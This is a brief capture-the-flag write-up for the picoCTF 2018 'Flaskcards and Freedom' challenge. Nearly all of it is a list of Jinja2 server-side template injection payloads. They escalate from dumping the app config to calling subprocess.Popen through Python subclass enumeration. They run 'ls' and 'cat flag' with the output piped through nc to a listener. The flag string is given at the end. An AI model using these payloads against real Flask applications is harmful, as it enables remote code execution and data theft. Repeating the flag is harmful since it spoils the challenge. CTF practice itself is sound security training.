> Flaskcards and Freedom - Points: 900 - (Solves: 150)
> There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell1.picoctf.com:56944 (link)

Valid payloads:
```
{{config}}

{{self}}

{{''.__class__.__mro__[1].__subclasses__()}}


# subrocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[304]}}

{{''.__class__.__mro__[1].__subclasses__()[304]('ls | nc 0.0.0.0 4444', shell=True)}}


{{''.__class__.__mro__[1].__subclasses__()[304]('cat flag | nc 0.0.0.0 4444', shell=True)}}
```


Flag: `picoCTF{R_C_E_wont_let_me_be_85e92c3a}`


